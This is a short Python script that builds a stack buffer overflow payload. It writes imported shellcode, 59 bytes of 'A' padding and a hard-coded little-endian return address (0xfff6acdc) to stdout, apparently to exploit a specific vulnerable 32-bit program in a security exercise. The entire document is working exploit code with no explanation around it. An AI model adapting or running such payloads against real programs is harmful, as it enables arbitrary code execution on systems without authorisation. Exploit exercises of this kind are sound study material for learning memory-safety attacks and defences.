from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"\x41"*59)
sys.stdout.buffer.write(0xfff6acdc.to_bytes(4,"little"))
